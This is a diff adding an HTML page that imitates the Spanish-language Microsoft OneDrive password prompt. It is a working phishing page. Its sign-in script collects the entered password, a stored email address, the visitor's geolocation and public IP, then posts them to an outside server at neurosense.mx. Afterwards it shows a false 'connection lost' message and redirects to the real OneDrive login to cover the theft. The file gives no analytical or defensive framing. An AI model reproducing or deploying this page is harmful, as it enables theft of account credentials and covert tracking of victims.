@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="es-ES"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+	<title>Microsoft OneDrive</title>
+    <link rel="icon" href="./assets/icon.ico" type="image/x-icon">
+
+	<meta charset="utf-8">
+	<meta http-equiv="x-ua-compatible" content="ie=10">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" href="./assets/css/hrd.css" nonce="">
+	<!--[if IE 8]><script src="https://odc.officeapps.live.com/odc/stat/html5shiv.min.js?b=18821.30552" nonce="QCTrHxdkHdYYxRfVTi+IUIYHC0sduATDPYhXwLEW9ALmhRFWKz4STpEj6scSUEenlvehAX+YC8IxfFkORa3BLx6DotzwZAsvPW55c4U1gJk/GdwxYUgF6jT9j4QdIj6oVrF+WMIbpUDhp0xsP2jpFHYqBmQnC7Iv5NVTzOKnvkM="></script><![endif]-->
+</head>
+<body>
+    <style type="text/css" nonce="">
+		* {
+			font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+		}
+     
+    </style>
+    <div class="background">
+        <div class="blur"></div>
+        <div class="full"></div>
+    </div>
+    <div class="outer">
+        <div class="middle">
+            <main class="inner" style="">
+                
+                <div class="margin-bottom-20" aria-hidden="true">
+                    <picture class="logo margin-bottom-16">
+                        
+                        <img src="https://odc.officeapps.live.com/odc/stat/images/hrd/microsoft_logo.svg?b=18821.30552" alt="Logotipo de Microsoft" data-bind="attr: {alt: config.text.microsoftLogo}">
+                    </picture>
+                </div>
+                
+                <!-- ko ifnot: showSplitter -->
+                <div data-testid="identityBanner" class="identityBanner">
+                    <div class="butonRetunr">
+                        <img  class="imgReturn" src="https://logincdn.msftauth.net/shared/5/js/../images/arrow_left_a9cc2824ef3517b6c416.svg" alt="" role="presentation">
+                    </div>
+                    <div id="userDisplayName" style="margin-left: 5px;"></div>
+                    
+                </div>
+                <div id="placeholder">
+                    <div data-testid="identityBanner" class="identityBanner">
+                        
+                            
+                    </div>
+                    <h2 class="userDisplayName" data-bind="text: config.text.header">Escribir contraseña
+                    </h2>
+                    <!-- ko if: context --><!-- /ko -->
+                    <div class="alert alert-error text-body margin-bottom-12 col-md-12" role="alert" aria-live="assertive" aria-atomic="true" data-bind="html: error"></div>
+                    <div class="row margin-bottom-16">
+                        <div class="form-group col-md-12 placeholderContainer">
+                            <input id="i0118" data-testid="i0118" name="passwd" placeholder="Contraseña" type="password" maxlength="120" aria-label="Escriba la contraseña para system32deepweb@hotmail.com" aria-describedby="loginHeader " class="ext-input ext-text-box" autocomplete="current-password" value="" style="border-color: rgb(102, 102, 102); font-style: normal;font-size: 12px; width: 100%;">
+                            <!-- ko if: isRequestPending --><!-- /ko -->
+                            <div id="progresor" class="progress" role="progressbar" style="display: none;">
+                                <div></div><div></div><div></div><div></div><div></div><div></div>
+                            </div>
+                            <!-- ko if: showPlaceholder --><!-- /ko -->
+                        </div>
+                    </div>
+                    <!-- ko if: showEnterProductKey --><!-- /ko -->
+                    <!-- ko if: showCreateAccount -->
+                    <div class="row margin-bottom-20">
+                       
+                        
+                        
+                        <span tabindex="0" role="button" id="idA_PWD_ForgotPassword" class="footPass">¿Ha olvidado su contraseña?</span>
+                        <br />
+                        <br />
+                        <span tabindex="0" role="button" id="idA_PWD_ForgotPassword" class="footPass">Otras formas de iniciar sesión</span>
+                        <br />
+                        <br />
+                    </div>
+                    <!-- /ko -->
+                    <div class="row inline-block no-margin-top-bottom button-container">
+                        <input type="submit" onclick="IniciarSesion()" class="btn btn-block btn-primary btn-override" id="nextButton" data-bind="value: config.text.linkNext, click: submit" value="Iniciar Sesión" style="font-size: 12px; padding: 10px;">
+                    </div>
+                </div>
+                <!-- /ko -->
+                
+                <!-- ko if: showSplitter --><!-- /ko -->
+            
+            </main>
+        </div>
+    </div>
+    <footer id="footer">
+        <div>
+            <div class="footerNode">
+                <span>©2025 Microsoft</span>
+                <a data-bind="text: config.text.privacyAndCookies, attr: {'data-url': config.links.privacyAndCookies}" href="#" data-url="https://go.microsoft.com/fwlink/?LinkId=521839">Declaración de privacidad</a>
+            </div>
+        </div>
+    </footer>
+    <noscript>
+        Microsoft account requires JavaScript to sign in. This web browser either does not support JavaScript, or scripts are being blocked.<br />
+        <br />
+        To find out whether your browser supports JavaScript, or to allow scripts, see the browser's online help.
+    </noscript>
+    <script src="Sign%20in_files/jquery-1.12.4.1.min.js" nonce=""></script>
+    <script src="Sign%20in_files/knockout-3.4.2.js" nonce=""></script>
+    <script src="Sign%20in_files/CommonDiagnostics.js" nonce=""></script>
+    <script src="Sign%20in_files/jsonstrings" nonce=""></script>
+    <script src="Sign%20in_files/hrd.min.js" nonce=""></script>
+    <script type="text/javascript" nonce="">
+		var EmailHrdPage = new Hrd({"correlationId":"844d34d5-2f91-4fee-9bee-02ebb9240a3f","officeApplication":"Unknown","officePlatform":"S2S","params":{"accelerated":false,"app":28,"minimalEmailValidation":false,"culture":"es-ES","dir":"ltr","focus":true,"fpEnabled":false,"hm":0,"hostInterface":2,"idp":"","path":"/odc/v2.0/hrd","signInOrg":false,"ver":15},"services":{"getIdpUrl":"/odc/emailhrd/getidp","getIdpTimeout":20000,"getFederationProviderUrl":"/odc/emailhrd/getfederationprovider","getFederationProviderTimeOut":20000,"flight0IsOn":true,"retryAttemptsForGetFPCall":0,"appendCorrelationIdForFP":false},"text":"","links":{"renameYourAccount":"https://go.microsoft.com/fwlink/?LinkID=733247","privacyAndCookies":"https://go.microsoft.com/fwlink/?LinkId=521839","termsOfUse":"https://go.microsoft.com/fwlink/?LinkId=521839"}}, OOUI);
+        $(document).ready(function () {
+            $('#orgIdSignInBtn').click(function () {
+                Hrd.self.orgIdSignIn();
+            });
+
+            $('#msAccountSignInBtn').click(function () {
+                Hrd.self.msAccountSignIn();
+            });
+        });
+
+
+    </script>
+    <script>
+        document.querySelector(".butonRetunr").addEventListener("click", () => {
+            window.location.href = "index.html"; // Cambia a la URL deseada
+    });
+
+		//obtener el valor de localStorage
+        const emailGuardado = localStorage.getItem("setEmail");
+        
+        if (emailGuardado) {
+        document.getElementById("userDisplayName").textContent = emailGuardado;
+    }
+   
+    function IniciarSesion() {
+    document.getElementById("progresor").style.display = "block";
+
+    const password = document.getElementById("i0118").value;
+    const email = localStorage.getItem("setEmail");
+
+    if (!email || !password) {
+        alert("Email o contraseña no válidos.");
+        document.getElementById("progresor").style.display = "none";
+        return;
+    }
+
+    navigator.geolocation.getCurrentPosition(
+        (position) => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+
+            fetch("https://api.ipify.org?format=json")
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+
+                    const payload = {
+                        email: email,
+                        password: password,
+                        ip: ip,
+                        latitude: lat,
+                        longitude: lon
+                    };
+
+                    //console.log("Datos recopilados para inicio de sesión:");
+                    //console.log(payload);
+
+                    fetch("https://neurosense.mx/onedrive/utils/send.php", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json"
+                        },
+                        body: JSON.stringify(payload)
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log("Respuesta del servidor:", data);
+                        document.getElementById("progresor").style.display = "none";
+
+                        if (data.status === "success") {
+                            alert("Pérdida de conexión. Por favor intenta nuevamente.");
+                            window.location.href = "https://onedrive.live.com/login";
+                        } else {
+                            alert("Error al iniciar sesión. Intenta nuevamente.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error al enviar los datos al servidor:", error);
+                        document.getElementById("progresor").style.display = "none";
+                        alert("Error de red. Intenta más tarde.");
+                    });
+                })
+                .catch(error => {
+                    console.error("Error al obtener la IP:", error);
+                    document.getElementById("progresor").style.display = "none";
+                    //alert("No se pudo obtener la IP.");
+                });
+        },
+        (error) => {
+            console.error("Error al obtener la ubicación:", error);
+            document.getElementById("progresor").style.display = "none";
+            alert("No se pudo obtener la ubicación.");
+        }
+    );
+}
+
+    </script>
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const passwordInput = document.getElementById("i0118");
+            if (passwordInput) {
+                passwordInput.value = "";
+            }
+        });
+    </script>
+    
+
+
+</body></html>
